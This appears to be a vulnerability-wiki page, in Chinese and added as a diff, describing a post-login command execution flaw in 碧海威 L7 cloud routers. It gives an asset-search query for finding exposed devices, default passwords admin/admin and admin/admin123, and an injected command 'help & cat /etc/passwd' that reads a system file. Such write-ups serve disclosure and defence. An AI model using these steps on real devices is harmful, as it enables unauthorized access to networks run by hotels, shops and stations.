@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%A2%A7%E6%B5%B7%E5%A8%81/%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>碧海威 L7多款产品存在后台命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u78a7\u6d77\u5a01 L7\u591a\u6b3e\u4ea7\u54c1\u5b58\u5728\u540e\u53f0\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        碧海威 L7多款产品存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81jumper%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81jumper%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        碧海威 L7多款产品jumper存在命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="l7">碧海威 L7多款产品存在后台命令执行漏洞<a class="headerlink" href="#l7" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>碧海威L7网络产品是为酒店、度假村、商场和车站等商用无线管理者独身订造的专用网络设备。设备具备路由、防火墙、流控、无线AC控制器、微信认证等多项功能。碧海威 L7多款产品存在后台命令执行漏洞</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>碧海威 L7云路由</li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>product=&quot;碧海威科技-L7云路由&quot;
+</code></pre></div>
+<p><img alt="1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d.png" src="./img/vvU9uRd8v176utG_/1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d-971649.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<p>使用弱口令登录后台</p>
+<div class="highlight"><pre><span></span><code>admin/admin
+admin/admin123
+</code></pre></div>
+<p><img alt="1717872584021-4caeb664-7765-42da-bd84-f9d711fc4f0a.png" src="./img/vvU9uRd8v176utG_/1717872584021-4caeb664-7765-42da-bd84-f9d711fc4f0a-997411.png" /></p>
+<div class="highlight"><pre><span></span><code>help &amp; cat /etc/passwd 
+</code></pre></div>
+<p><img alt="1717873247660-03aaa28f-7534-404a-9426-de729a732f3e.png" src="./img/vvU9uRd8v176utG_/1717873247660-03aaa28f-7534-404a-9426-de729a732f3e-517323.png" /></p>
+<blockquote>
+<p>更新: 2024-06-27 09:15:18<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/tteea03oq5v1vp29">https://www.yuque.com/xiaokp7/ocvun2/tteea03oq5v1vp29</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        碧海威 L7多款产品存在弱口令漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81jumper%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E5%A4%9A%E6%AC%BE%E4%BA%A7%E5%93%81jumper%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        碧海威 L7多款产品jumper存在命令执行漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
